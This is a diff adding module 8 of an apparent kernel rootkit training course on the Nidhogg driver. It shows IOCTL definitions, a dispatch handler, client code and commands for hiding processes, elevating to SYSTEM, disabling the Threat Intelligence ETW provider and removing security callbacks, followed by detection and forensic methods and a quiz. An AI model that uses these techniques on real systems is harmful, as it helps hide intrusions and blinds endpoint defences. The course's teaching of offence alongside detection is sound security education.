@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 8: Full Chain, IOCTL Interface & Detection - Nidhogg Course</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>&#x1F409;</text></svg>">
+<link rel="stylesheet" href="../../../assets/course.css">
+<style>:root{--accent:#dc2626;--accent2:#b91c1c;--gradient:linear-gradient(135deg,#dc2626,#b91c1c)}</style>
+</head>
+<body>
+
+<button class="hamburger" aria-label="Toggle navigation">&#9776;</button>
+
+<nav>
+<div class="logo">
+<h2>Nidhogg Course</h2>
+<span>Kernel Rootkit Masterclass</span>
+</div>
+<a class="home-link" href="../Nidhogg_index.html">&larr; Course Home</a>
+<a class="mod-link" href="module1.html"><span>1. Kernel vs User-Mode</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module2.html"><span>2. Driver Basics</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module3.html"><span>3. Process &amp; Thread</span><span class="diff d1">d1</span></a>
+<a class="mod-link" href="module4.html"><span>4. File &amp; Registry</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module5.html"><span>5. ETW Disabling</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module6.html"><span>6. Callbacks &amp; Notifications</span><span class="diff d2">d2</span></a>
+<a class="mod-link" href="module7.html"><span>7. Memory Evasion</span><span class="diff d3">d3</span></a>
+<a class="mod-link active" href="module8.html"><span>8. Full Chain &amp; Detection</span><span class="diff d3">d3</span></a>
+</nav>
+
+<main>
+<span class="diff-badge hard">Difficulty: Advanced</span>
+<h1>Module 8: Full Chain, IOCTL Interface &amp; Detection</h1>
+<p class="subtitle">Complete Nidhogg architecture, the IOCTL command table, user-mode client, and how to detect kernel rootkits.</p>
+
+<div class="card highlight">
+<h4>Module Objective</h4>
+<p>Bring together all previous modules into a complete picture of Nidhogg&rsquo;s architecture, understand the full IOCTL command dispatch table that maps user-mode requests to kernel operations, examine the NidhoggClient user-mode tool, and learn the detection strategies that defenders use to identify kernel rootkits including driver verification, PatchGuard, and forensic techniques.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>1. Nidhogg Complete Architecture</h2>
+
+<p>Nidhogg is a two-component system. All techniques from Modules 1-7 are orchestrated through a central IOCTL dispatch model:</p>
+
+<div class="diagram">
+<h4 style="color:var(--accent);margin-bottom:15px;text-align:center">Complete System Architecture</h4>
+<div class="flow">
+<div class="flow box">NidhoggClient.exe<br><small>User-mode C++<br>Command-line interface</small></div>
+<div class="flow arrow">&rarr; IOCTL &rarr;</div>
+<div class="flow box">Nidhogg.sys<br><small>Kernel driver<br>IRP_MJ_DEVICE_CONTROL</small></div>
+<div class="flow arrow">&rarr;</div>
+<div class="flow box">Kernel Subsystems<br><small>EPROCESS, VAD, ETW,<br>Callbacks, IRP hooks</small></div>
+</div>
+</div>
+
+<div class="card">
+<h4>Component Responsibilities</h4>
+<table>
+<tr><th>Component</th><th>Language</th><th>Responsibility</th></tr>
+<tr><td><strong>Nidhogg.sys</strong></td><td>C (WDK)</td><td>Kernel driver: receives IOCTLs, manipulates kernel structures, registers callbacks, hooks IRP handlers</td></tr>
+<tr><td><strong>NidhoggClient.exe</strong></td><td>C++</td><td>User-mode client: parses commands, serializes parameters, sends IOCTLs via DeviceIoControl, displays results</td></tr>
+<tr><td><strong>NidhoggLib (header)</strong></td><td>C/C++</td><td>Shared definitions: IOCTL codes, data structures, constants used by both components</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<h2>2. The IOCTL Command Table</h2>
+
+<p>Nidhogg defines a comprehensive set of IOCTL codes, each mapping to a specific rootkit capability. The dispatch table is the central routing mechanism:</p>
+
+<pre><span class="lang-tag">C</span>// Nidhogg IOCTL definitions (representative set)
+#define IOCTL_NIDHOGG_BASE  FILE_DEVICE_UNKNOWN
+
+// Process operations
+#define IOCTL_PROTECT_PROCESS    CTL_CODE(IOCTL_NIDHOGG_BASE, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_UNPROTECT_PROCESS  CTL_CODE(IOCTL_NIDHOGG_BASE, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_PROCESS       CTL_CODE(IOCTL_NIDHOGG_BASE, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_UNHIDE_PROCESS     CTL_CODE(IOCTL_NIDHOGG_BASE, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_ELEVATE_PROCESS    CTL_CODE(IOCTL_NIDHOGG_BASE, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+// Thread operations
+#define IOCTL_PROTECT_THREAD     CTL_CODE(IOCTL_NIDHOGG_BASE, 0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_HIDE_THREAD        CTL_CODE(IOCTL_NIDHOGG_BASE, 0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+// File operations
+#define IOCTL_PROTECT_FILE       CTL_CODE(IOCTL_NIDHOGG_BASE, 0x820, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_UNPROTECT_FILE     CTL_CODE(IOCTL_NIDHOGG_BASE, 0x821, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+// Registry operations
+#define IOCTL_PROTECT_REGKEY     CTL_CODE(IOCTL_NIDHOGG_BASE, 0x830, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_UNPROTECT_REGKEY   CTL_CODE(IOCTL_NIDHOGG_BASE, 0x831, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_PROTECT_REGVALUE   CTL_CODE(IOCTL_NIDHOGG_BASE, 0x832, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+// ETW operations
+#define IOCTL_DISABLE_ETW        CTL_CODE(IOCTL_NIDHOGG_BASE, 0x840, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_ENABLE_ETW         CTL_CODE(IOCTL_NIDHOGG_BASE, 0x841, METHOD_BUFFERED, FILE_ANY_ACCESS)
+
+// Callback operations
+#define IOCTL_LIST_CALLBACKS     CTL_CODE(IOCTL_NIDHOGG_BASE, 0x850, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_REMOVE_CALLBACK    CTL_CODE(IOCTL_NIDHOGG_BASE, 0x851, METHOD_BUFFERED, FILE_ANY_ACCESS)
+#define IOCTL_RESTORE_CALLBACK   CTL_CODE(IOCTL_NIDHOGG_BASE, 0x852, METHOD_BUFFERED, FILE_ANY_ACCESS)</pre>
+
+<!-- ============================================================ -->
+<h2>3. The Central Dispatch Handler</h2>
+
+<p>The <code>IRP_MJ_DEVICE_CONTROL</code> handler is the driver's central nervous system, routing each IOCTL to the appropriate subsystem:</p>
+
+<pre><span class="lang-tag">C</span>NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
+    UNREFERENCED_PARAMETER(DeviceObject);
+    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
+    NTSTATUS status = STATUS_SUCCESS;
+    ULONG bytesReturned = 0;
+
+    PVOID buffer   = Irp->AssociatedIrp.SystemBuffer;
+    ULONG inLen    = stack->Parameters.DeviceIoControl.InputBufferLength;
+    ULONG outLen   = stack->Parameters.DeviceIoControl.OutputBufferLength;
+    ULONG ioctl    = stack->Parameters.DeviceIoControl.IoControlCode;
+
+    switch (ioctl) {
+    // ---- Process operations ----
+    case IOCTL_PROTECT_PROCESS:
+        if (inLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
+        status = ProtectProcess(*(PULONG)buffer);
+        break;
+
+    case IOCTL_HIDE_PROCESS:
+        if (inLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
+        status = HideProcess(*(PULONG)buffer);
+        break;
+
+    case IOCTL_ELEVATE_PROCESS:
+        if (inLen < sizeof(ULONG)) { status = STATUS_BUFFER_TOO_SMALL; break; }
+        status = ElevateProcessToken(*(PULONG)buffer);
+        break;
+
+    // ---- File operations ----
+    case IOCTL_PROTECT_FILE:
+        if (inLen < sizeof(WCHAR) * 2) { status = STATUS_BUFFER_TOO_SMALL; break; }
+        status = AddProtectedFile((PWCHAR)buffer, inLen);
+        break;
+
+    // ---- Registry operations ----
+    case IOCTL_PROTECT_REGKEY:
+        if (inLen < sizeof(WCHAR) * 2) { status = STATUS_BUFFER_TOO_SMALL; break; }
+        status = AddProtectedRegistryKey((PWCHAR)buffer, inLen);
+        break;
+
+    // ---- ETW operations ----
+    case IOCTL_DISABLE_ETW:
+        if (inLen < sizeof(GUID)) { status = STATUS_BUFFER_TOO_SMALL; break; }
+        status = DisableEtwProvider((PGUID)buffer);
+        break;
+
+    // ---- Callback operations ----
+    case IOCTL_LIST_CALLBACKS: {
+        if (outLen < sizeof(CALLBACK_INFO) * 64) {
+            status = STATUS_BUFFER_TOO_SMALL; break;
+        }
+        ULONG count = 0;
+        status = EnumerateProcessCallbacks(
+            (PCALLBACK_INFO)buffer, 64, &count
+        );
+        bytesReturned = count * sizeof(CALLBACK_INFO);
+        break;
+    }
+    case IOCTL_REMOVE_CALLBACK:
+        if (inLen < sizeof(CALLBACK_REMOVE_INFO)) {
+            status = STATUS_BUFFER_TOO_SMALL; break;
+        }
+        PCALLBACK_REMOVE_INFO removeInfo = (PCALLBACK_REMOVE_INFO)buffer;
+        status = RemoveCallback(removeInfo->Type, removeInfo->Index);
+        break;
+
+    default:
+        status = STATUS_INVALID_DEVICE_REQUEST;
+        break;
+    }
+
+    Irp->IoStatus.Status = status;
+    Irp->IoStatus.Information = bytesReturned;
+    IoCompleteRequest(Irp, IO_NO_INCREMENT);
+    return status;
+}</pre>
+
+<!-- ============================================================ -->
+<h2>4. NidhoggClient: The User-Mode Tool</h2>
+
+<p>NidhoggClient provides a command-line interface that translates human-readable commands into IOCTL calls:</p>
+
+<pre><span class="lang-tag">C++</span>// NidhoggClient main command dispatcher
+int wmain(int argc, wchar_t* argv[]) {
+    // Open handle to the Nidhogg driver
+    HANDLE hDevice = CreateFileW(
+        L"\\\\.\\Nidhogg", GENERIC_READ | GENERIC_WRITE,
+        0, NULL, OPEN_EXISTING, 0, NULL
+    );
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        wprintf(L"[-] Failed to open Nidhogg device. Is the driver loaded?\n");
+        return 1;
+    }
+
+    // Parse command
+    if (wcscmp(argv[1], L"process") == 0) {
+        if (wcscmp(argv[2], L"hide") == 0) {
+            DWORD pid = _wtoi(argv[3]);
+            SendIoctl(hDevice, IOCTL_HIDE_PROCESS, &pid, sizeof(pid));
+        }
+        else if (wcscmp(argv[2], L"protect") == 0) {
+            DWORD pid = _wtoi(argv[3]);
+            SendIoctl(hDevice, IOCTL_PROTECT_PROCESS, &pid, sizeof(pid));
+        }
+        else if (wcscmp(argv[2], L"elevate") == 0) {
+            DWORD pid = _wtoi(argv[3]);
+            SendIoctl(hDevice, IOCTL_ELEVATE_PROCESS, &pid, sizeof(pid));
+        }
+    }
+    else if (wcscmp(argv[1], L"file") == 0) {
+        if (wcscmp(argv[2], L"protect") == 0) {
+            SendIoctl(hDevice, IOCTL_PROTECT_FILE,
+                argv[3], (wcslen(argv[3]) + 1) * sizeof(WCHAR));
+        }
+    }
+    // ... other command categories ...
+
+    CloseHandle(hDevice);
+    return 0;
+}</pre>
+
+<div class="card">
+<h4>Example Command Usage</h4>
+<pre><span class="lang-tag">Batch</span>:: Hide a process by PID
+NidhoggClient.exe process hide 1234
+
+:: Protect a file from deletion
+NidhoggClient.exe file protect \Device\HarddiskVolume3\payload\implant.exe
+
+:: Protect a registry key
+NidhoggClient.exe reg protect \REGISTRY\MACHINE\SYSTEM\...\Services\Nidhogg
+
+:: Disable the Threat Intelligence ETW provider
+NidhoggClient.exe etw disable {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
+
+:: List all process creation callbacks
+NidhoggClient.exe callbacks list process
+
+:: Remove a specific callback by index
+NidhoggClient.exe callbacks remove process 3
+
+:: Elevate a process to SYSTEM
+NidhoggClient.exe process elevate 5678</pre>
+</div>
+
+<!-- ============================================================ -->
+<h2>5. Initialization Sequence</h2>
+
+<p>When the driver loads, <code>DriverEntry</code> orchestrates the initialization of all subsystems:</p>
+
+<pre><span class="lang-tag">C</span>NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
+    NTSTATUS status;
+
+    // 1. Create device object and symbolic link (Module 2)
+    status = CreateDeviceAndSymLink(DriverObject);
+    if (!NT_SUCCESS(status)) return status;
+
+    // 2. Set IRP dispatch routines
+    DriverObject->MajorFunction[IRP_MJ_CREATE]         = NidhoggCreateClose;
+    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = NidhoggCreateClose;
+    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = NidhoggDeviceControl;
+    DriverObject->DriverUnload = NidhoggUnload;
+
+    // 3. Resolve dynamic offsets for current Windows build
+    status = ResolveKernelOffsets();
+    if (!NT_SUCCESS(status)) goto cleanup;
+
+    // 4. Install file protection hook (Module 4)
+    status = InstallFileProtectionHook();
+    // Non-fatal: log and continue if hook fails
+
+    // 5. Register registry callbacks (Module 4)
+    status = InstallRegistryProtection();
+    // Non-fatal: log and continue
+
+    // 6. Register object callbacks for process/thread protection (Module 3)
+    status = InstallObjectCallbacks();
+    // Non-fatal: log and continue
+
+    // 7. Locate callback arrays for future enumeration/removal (Module 6)
+    status = LocateCallbackArrays();
+    // Non-fatal: log and continue
+
+    // 8. Locate ETW structures for future provider disabling (Module 5)
+    status = LocateEtwStructures();
+    // Non-fatal: log and continue
+
+    return STATUS_SUCCESS;
+
+cleanup:
+    CleanupDevice(DriverObject);
+    return status;
+}</pre>
+
+<div class="card green">
+<h4>Graceful Degradation</h4>
+<p>Nidhogg is designed to partially function even if some subsystems fail to initialize. If registry callback registration fails, the driver still provides process hiding and ETW disabling. Only the device/symlink creation and offset resolution are fatal failures, because without them no communication or safe kernel access is possible.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>6. Driver Unload and Cleanup</h2>
+
+<p>Clean unloading requires undoing every modification in reverse order:</p>
+
+<pre><span class="lang-tag">C</span>VOID NidhoggUnload(PDRIVER_OBJECT DriverObject) {
+    // 1. Restore ETW providers (Module 5)
+    RestoreAllEtwProviders();
+
+    // 2. Unregister registry callbacks (Module 4)
+    CmUnRegisterCallback(g_RegCallbackCookie);
+
+    // 3. Unregister object callbacks (Module 3)
+    ObUnRegisterCallbacks(g_ObCallbackHandle);
+
+    // 4. Restore NTFS IRP hook (Module 4)
+    if (g_NtfsDriverObject && g_OriginalNtfsMjCreate) {
+        InterlockedExchangePointer(
+            (PVOID*)&g_NtfsDriverObject->MajorFunction[IRP_MJ_CREATE],
+            (PVOID)g_OriginalNtfsMjCreate
+        );
+    }
+
+    // 5. Re-link any hidden processes (Module 3)
+    UnhideAllProcesses();
+
+    // 6. Restore any modified VADs/PTEs (Module 7)
+    RestoreAllMemoryModifications();
+
+    // 7. Delete symbolic link and device object (Module 2)
+    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Nidhogg");
+    IoDeleteSymbolicLink(&symLink);
+    IoDeleteDevice(DriverObject->DeviceObject);
+
+    // 8. Free all pool allocations
+    FreeAllAllocations();
+}</pre>
+
+<!-- ============================================================ -->
+<h2>7. Detection: Driver Verification</h2>
+
+<p>Defenders have several strategies for detecting kernel rootkits. The first line of defense is driver verification:</p>
+
+<table>
+<tr><th>Detection Method</th><th>What It Checks</th><th>Effectiveness Against Nidhogg</th></tr>
+<tr><td><strong>Loaded driver enumeration</strong></td><td><code>NtQuerySystemInformation(SystemModuleInformation)</code> lists all loaded modules</td><td>Effective if loaded via sc.exe; ineffective if manually mapped (kdmapper)</td></tr>
+<tr><td><strong>Driver signature verification</strong></td><td>Check all loaded drivers have valid Authenticode signatures</td><td>Effective if loaded normally; bypassed by BYOVD + manual mapping</td></tr>
+<tr><td><strong>Known vulnerable driver detection</strong></td><td>Microsoft's vulnerable driver blocklist (<code>Microsoft-Recommended-Driver-Block-Rules</code>)</td><td>Blocks known BYOVD vectors but new vulnerable drivers are constantly found</td></tr>
+<tr><td><strong>Device object enumeration</strong></td><td>Walk the object namespace for suspicious device objects (<code>\Device\Nidhogg</code>)</td><td>Effective: the device object must exist for IOCTL communication</td></tr>
+<tr><td><strong>Pool tag scanning</strong></td><td>Scan kernel pool for known tags used by the rootkit</td><td>Moderate: tags can be changed at compile time</td></tr>
+</table>
+
+<pre><span class="lang-tag">C++</span>// Defender tool: enumerate device objects looking for rootkit indicators
+// Using NtOpenDirectoryObject + NtQueryDirectoryObject to walk \Device
+void ScanForSuspiciousDevices() {
+    // Known rootkit device names to check
+    const wchar_t* suspiciousNames[] = {
+        L"Nidhogg", L"Cronos", L"KernelRootkit",
+        // ... other known rootkit device names
+    };
+    // Walk \Device namespace and check for matches
+}</pre>
+
+<!-- ============================================================ -->
+<h2>8. Detection: Kernel Integrity Verification</h2>
+
+<p>Beyond driver enumeration, defenders can verify the integrity of kernel structures that rootkits modify:</p>
+
+<div class="card">
+<h4>Integrity Checks</h4>
+<table>
+<tr><th>Check</th><th>What Is Verified</th><th>Detects</th></tr>
+<tr><td><strong>ActiveProcessLinks walking</strong></td><td>Compare process count from ActiveProcessLinks vs. HandleTable vs. CID table</td><td>DKOM-hidden processes: HandleTable has entries for processes not in ActiveProcessLinks</td></tr>
+<tr><td><strong>SSDT verification</strong></td><td>All SSDT entries should point within ntoskrnl address range</td><td>SSDT hooking (not used by Nidhogg, but checked anyway)</td></tr>
+<tr><td><strong>IRP hook detection</strong></td><td>MajorFunction table entries should point within the original driver</td><td>Nidhogg's NTFS IRP_MJ_CREATE hook</td></tr>
+<tr><td><strong>Callback array integrity</strong></td><td>Count and verify all callback registrations against expected count</td><td>Callback removal (Module 6)</td></tr>
+<tr><td><strong>ETW provider verification</strong></td><td>Check IsEnabled state of critical providers matches expected state</td><td>ETW provider disabling (Module 5)</td></tr>
+</table>
+</div>
+
+<pre><span class="lang-tag">C</span>// Detection: Find DKOM-hidden processes
+// Walk ActiveProcessLinks AND the PspCidTable (handle table)
+// Processes in CidTable but not in ActiveProcessLinks are hidden
+
+VOID DetectHiddenProcesses() {
+    // Method 1: Walk ActiveProcessLinks (user-mode accessible via
+    //           NtQuerySystemInformation)
+    LIST_ENTRY-based processes;
+
+    // Method 2: Walk PspCidTable (requires kernel driver)
+    // PspCidTable contains an entry for every process/thread ever created
+    // It is NOT modified by DKOM (ActiveProcessLinks unlinking)
+
+    // Compare: processes in CidTable but missing from ActiveProcessLinks
+    // = hidden processes
+}</pre>
+
+<!-- ============================================================ -->
+<h2>9. PatchGuard / Kernel Patch Protection (KPP)</h2>
+
+<p>PatchGuard is Microsoft's mechanism for detecting unauthorized kernel modifications. Understanding what it does and does not monitor is critical for both attackers and defenders:</p>
+
+<table>
+<tr><th>Monitored by PatchGuard</th><th>Not Reliably Monitored by PatchGuard</th></tr>
+<tr><td>SSDT (System Service Descriptor Table)</td><td>ETW GuidEntry structures</td></tr>
+<tr><td>IDT (Interrupt Descriptor Table)</td><td>ObRegisterCallbacks registrations</td></tr>
+<tr><td>GDT (Global Descriptor Table)</td><td>CmRegisterCallbackEx registrations</td></tr>
+<tr><td>Critical ntoskrnl code sections</td><td>Process/thread token pointers</td></tr>
+<tr><td>LSTAR MSR (syscall entry)</td><td>Notification callback arrays (varies by build)</td></tr>
+<tr><td>Certain IRP dispatch tables (varies)</td><td>&nbsp;</td></tr>
+<tr><td>Some kernel data structures including EPROCESS lists (varies by build)</td><td>&nbsp;</td></tr>
+</table>
+
+<div class="card warn">
+<h4>PatchGuard Limitations and DKOM Risk</h4>
+<p>PatchGuard runs at unpredictable intervals (randomized timing). It checks a <strong>snapshot</strong> of protected structures. A sophisticated rootkit could theoretically restore modifications before PatchGuard runs and re-apply them afterward. However, it is important to note that <strong>DKOM is NOT guaranteed to be PatchGuard-safe</strong>. PatchGuard's monitoring scope varies between Windows builds and has expanded over time. Nidhogg's own documentation acknowledges that PatchGuard can detect DKOM modifications to EPROCESS linked lists. While some of Nidhogg's other techniques (ETW manipulation, token replacement, documented callback APIs) operate on structures that PatchGuard does not typically monitor, DKOM process hiding carries a real risk of PatchGuard detection on newer Windows builds.</p>
+</div>
+
+<!-- ============================================================ -->
+<h2>10. Forensic Detection Strategies</h2>
+
+<p>Advanced forensics goes beyond live system checks, examining memory dumps and artifacts that rootkits cannot easily hide:</p>
+
+<div class="card green">
+<h4>Memory Forensics (Volatility Framework)</h4>
+<ul>
+<li><strong>psxview</strong>: Cross-references multiple process listing methods (ActiveProcessLinks, CID table, PspCidTable walk, session list, handle table) to find hidden processes</li>
+<li><strong>driverirp</strong>: Lists all drivers and their IRP MajorFunction handlers, highlighting any that point outside the driver's own address range (detects IRP hooking)</li>
+<li><strong>callbacks</strong>: Enumerates all registered notification callbacks and identifies which driver registered each one</li>
+<li><strong>ssdt</strong>: Validates SSDT entries and identifies hooks</li>
+<li><strong>vadinfo</strong>: Examines VAD tree entries for inconsistencies (missing entries, mismatched flags vs PTE protections)</li>
+</ul>
+</div>
+
+<table>
+<tr><th>Detection Approach</th><th>Detects Which Nidhogg Feature</th></tr>
+<tr><td>Cross-reference process lists (psxview)</td><td>DKOM process hiding (Module 3)</td></tr>
+<tr><td>IRP hook scan (driverirp)</td><td>File protection hooks (Module 4)</td></tr>
+<tr><td>Callback enumeration</td><td>Callback removal (Module 6)</td></tr>
+<tr><td>ETW provider state check</td><td>ETW disabling (Module 5)</td></tr>
+<tr><td>VAD/PTE consistency check</td><td>Memory hiding (Module 7)</td></tr>
+<tr><td>Device object namespace scan</td><td>Driver presence via device name</td></tr>
+<tr><td>Pool tag scanning</td><td>Kernel memory allocations by the rootkit</td></tr>
+</table>
+
+<!-- ============================================================ -->
+<h2>11. Operational Security Summary</h2>
+
+<div class="card">
+<h4>Red Team Best Practices with Kernel Rootkits</h4>
+<table>
+<tr><th>Principle</th><th>Implementation</th></tr>
+<tr><td><strong>Always have a cleanup path</strong></td><td>Support driver unload that reverses all modifications; never leave permanent artifacts</td></tr>
+<tr><td><strong>Minimize footprint</strong></td><td>Use only the features needed for the engagement; do not enable all capabilities by default</td></tr>
+<tr><td><strong>Test on matching OS version</strong></td><td>EPROCESS offsets and pattern scans are build-specific; test on the target's exact build</td></tr>
+<tr><td><strong>Have a BSOD recovery plan</strong></td><td>Kernel bugs cause blue screens; know how to recover the target system if the rootkit crashes</td></tr>
+<tr><td><strong>Document everything</strong></td><td>Record every rootkit action (hidden PIDs, protected files, disabled providers) for cleanup and reporting</td></tr>
+<tr><td><strong>Coordinate with defenders</strong></td><td>In a purple team engagement, share detection opportunities and indicators</td></tr>
+</table>
+</div>
+
+<!-- ============================================================ -->
+<div class="quiz">
+<h2>Knowledge Check</h2>
+
+<div class="quiz-q" data-answer="B">
+<p>Q1: How can a defender detect a DKOM-hidden process?</p>
+<div class="quiz-btn" data-choice="A">A) By running Task Manager, which bypasses DKOM</div>
+<div class="quiz-btn" data-choice="B">B) By cross-referencing process lists from ActiveProcessLinks against the PspCidTable handle table; processes in CidTable but not in ActiveProcessLinks are hidden</div>
+<div class="quiz-btn" data-choice="C">C) DKOM-hidden processes cannot be detected by any means</div>
+<div class="quiz-btn" data-choice="D">D) By checking the Windows Event Log for process creation events</div>
+</div>
+
+<div class="quiz-q" data-answer="A">
+<p>Q2: Why does Nidhogg use DKOM rather than SSDT hooking, even though neither is fully PatchGuard-safe?</p>
+<div class="quiz-btn" data-choice="A">A) PatchGuard reliably monitors the SSDT, making SSDT hooking almost certain to trigger a BSOD; DKOM modifies data structure links that PatchGuard monitors less consistently, though detection is still possible on newer builds</div>
+<div class="quiz-btn" data-choice="B">B) DKOM runs at a higher privilege than PatchGuard</div>
+<div class="quiz-btn" data-choice="C">C) PatchGuard only runs on older Windows versions</div>
+<div class="quiz-btn" data-choice="D">D) DKOM is a Microsoft-approved technique</div>
+</div>
+
+<div class="quiz-q" data-answer="C">
+<p>Q3: What is the most reliable forensic technique for detecting Nidhogg's NTFS IRP hook?</p>
+<div class="quiz-btn" data-choice="A">A) Checking the system event log for hook installation events</div>
+<div class="quiz-btn" data-choice="B">B) Running pe-sieve on the NTFS process</div>
+<div class="quiz-btn" data-choice="C">C) Enumerating the NTFS driver's MajorFunction table and checking if any handlers point to addresses outside the NTFS driver's image range</div>
+<div class="quiz-btn" data-choice="D">D) Monitoring network traffic for rootkit C2 communication</div>
+</div>
+</div>
+
+<div class="nav-btns">
+<a href="module7.html">&larr; Previous: Memory Scanner Evasion</a>
+<span></span>
+</div>
+</main>
+
+<script src="../../../assets/course.js"></script>
+</body>
+</html>
